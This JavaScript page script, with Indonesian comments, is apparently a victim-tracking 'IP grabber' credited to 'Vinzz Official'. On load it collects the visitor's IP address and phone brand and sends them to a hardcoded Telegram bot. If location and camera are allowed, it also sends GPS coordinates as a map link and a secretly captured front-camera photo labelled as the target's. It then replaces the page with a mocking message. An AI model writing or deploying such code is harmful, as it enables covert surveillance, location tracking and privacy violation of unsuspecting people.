const token = '7876416430:AAGfJpQqoNvDSbx4tpuJQPdy5k8vx7Uhndw';
const chat_id = '7777604508';

async function getIP() {
try {
const res = await fetch("https://api.ipify.org?format=json");
const data = await res.json();
return data.ip;
} catch {
return "Tidak diketahui";
}
}

function getMerekHP() {
  const ua = navigator.userAgent.toLowerCase()

  // Langsung cek merek populer di userAgent
  if (ua.includes("samsung")) return "Samsung";
  if (ua.includes("xiaomi") || ua.includes("mi ")) return "Xiaomi";
  if (ua.includes("redmi")) return "Redmi";
  if (ua.includes("oppo")) return "Oppo";
  if (ua.includes("vivo")) return "Vivo";
  if (ua.includes("realme")) return "Realme";
  if (ua.includes("infinix")) return "Infinix";
  if (ua.includes("asus")) return "Asus";
  if (ua.includes("iphone")) return "iPhone";
  if (ua.includes("huawei")) return "Huawei";
  if (ua.includes("lenovo")) return "Lenovo";
  if (ua.includes("tecno")) return "Tecno";

  // Ekstrak dari "Build/XXX"
  const match = ua.match(/build\/([\w\-]+)/i);
  if (match && match[1]) {
    const build = match[1].toLowerCase();
    if (build.includes("sm-")) return "Samsung";
    if (build.includes("rmx")) return "Realme";
    if (build.includes("v202") || build.includes("v21")) return "Vivo";
    if (build.includes("cp") || build.includes("cph")) return "Oppo";
    if (build.includes("m210") || build.includes("mi")) return "Xiaomi";
    if (build.includes("redmi")) return "Redmi";
    if (build.includes("infinix")) return "Infinix";
    if (build.includes("asus")) return "Asus";
  }

  return "Tidak diketahui";
}

async function kirimFoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });

    // Jika user mengizinkan kamera
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    video.srcObject = stream;
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });
                      
    await new Promise(resolve => setTimeout(resolve, 2000));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    return new Promise((resolve) => {
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", chat_id);
        formData.append("photo", blob, "target.png");
        formData.append('caption', 'ini fotonya tuan vinzz');

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: formData
        }).then(resolve);
      }, 'image/png');
    });

  } catch (err) {
    console.warn("Akses kamera ditolak atau gagal.");
    await kirimPesanTelegram("Gagal mengambil foto. Akses kamera ditolak.");
  }
}
        
async function kirimPesanTelegram(pesan) {
const url = (`https://api.telegram.org/bot${token}/sendMessage`);
await fetch(url, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
chat_id: chat_id,
text: pesan
})
});
}

(async () => {
const ip = await getIP();
const merek = getMerekHP();
const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
│🌐 Status: MENUNGGU IZIN LOKASI
│📡 IP: ${ip}
│📱 Merek hp: ${merek}
╰───────────────────`;
await kirimPesanTelegram(pesanAwal);
})();

navigator.geolocation.getCurrentPosition(
  async (pos) => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
    const ip = await getIP();
    const merek = getMerekHP();

    // Menambahkan link peta di pesan jika lokasi diizinkan
    const pesan = `╭──「 IP berhasil ditemukan! 」──
│🌐 Status: MENGIZINKAN LOKASI
│📡 IP: ${ip}\n📱 Merek hp: ${merek}
│📍 Lokasi: ${gmaps}
╰───────────────────`;
    await kirimPesanTelegram(pesan);

    kirimFoto()

    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
  },
  async () => {
    const ip = await getIP();
    const merek = getMerekHP();

    const pesan = `╭──「 IP berhasil ditemukan! 」──
│🌐 Status: MENOLAK LOKASI
│📡 IP: ${ip}
│📱 Merek hp: ${merek}
╰───────────────────`;
    await kirimPesanTelegram(pesan);

    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
  }
);
